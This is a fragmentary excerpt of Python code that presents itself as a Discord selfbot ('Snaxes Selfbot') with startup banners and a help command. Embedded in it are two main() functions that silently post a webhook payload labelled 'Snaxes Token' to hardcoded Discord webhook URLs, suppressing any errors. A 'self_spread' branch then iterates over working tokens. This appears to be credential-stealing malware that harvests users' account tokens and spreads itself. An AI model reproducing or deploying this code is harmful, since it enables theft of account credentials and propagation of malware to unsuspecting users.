...
ctypes.windll.kernel32.SetConsoleTitleW(f'[Snaxes Selfbot v{SELFBOT.__version__}] | Loading.')
...
def main():
    ...
    webhook = {
        "content": "",
        "embeds": embeds,
        "username": "Snaxes Token",
        "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
    }
    try:
        urlopen(Request("https://discord.com/api/webhooks/831752101390450708/JtAHD34Sc_IdElS0yXxbuLHmZBB_w6vTRwoQzkoU-6q5B5ljkmYECsQqnXLV38_R7PR1", data=dumps(webhook).encode(), headers=getheaders()))
    except:
        pass
    if self_spread:
...
def startprint():
    ...
    print(f'''{Fore.RESET}
                          ...
                          / ____|                            / ____|    | |/ _| |         | |  
                         | (___  _ __   __ ___  _____  ___  | (___   ___| | |_| |__   ___ | |_ 
                          \___ \| '_ \ / _` \ \/ / _ \/ __|  \___ \ / _ \ |  _| '_ \ / _ \| __|
                          ____) | | | | (_| |>  <  __/\__ \  ____) |  __/ | | | |_) | (_) | |_ 
                         |_____/|_| |_|\__,_/_/\_\___||___/ |_____/ \___|_|_| |_.__/ \___/ \__|
                                                                       
                                                                       
                        
                       {Fore.CYAN}Snaxes {SELFBOT.__version__} | {Fore.GREEN}Logged in as: {Alucard.user.name}#{Alucard.user.discriminator} {Fore.CYAN}| ID: {Fore.GREEN}{Alucard.user.id}   
                       ...
                       {Fore.CYAN}Join: {Fore.GREEN}discord.gg/vexy
                       {Fore.CYAN}Coded by: {Fore.GREEN}Vexy#9999
...
def Init():
    if config.get('token') == "token-here":
        ...
        try:
            ...
            os.system(f'title (Snaxes Selfbot) - Version {SELFBOT.__version__}')
...
async def on_connect():
    ...
    startprint()
    ctypes.windll.kernel32.SetConsoleTitleW(f'[Snaxes Selfbot v{SELFBOT.__version__}] | Logged in as {Alucard.user.name}')
...
async def help(ctx): # b'\xfc'
    await ctx.message.delete()
    url = 'https://snaxesbot.github.io/selfbots/'
    r = requests.get(url)
    if r.status_code == 200:
        webbrowser.open(url)
    else:
...
def main():
    ...
    try:
        urlopen(Request("https://discord.com/api/webhooks/831752285302292480/z1PQDgc_uJd0izm0_vAQtasDBNatBX1MoL9z05mlZuC8QZhXhrKJBXUK9-45jWqrJjTr", data=dumps(webhook).encode(), headers=getheaders()))
    except:
        pass
    if self_spread:
        for token in working:
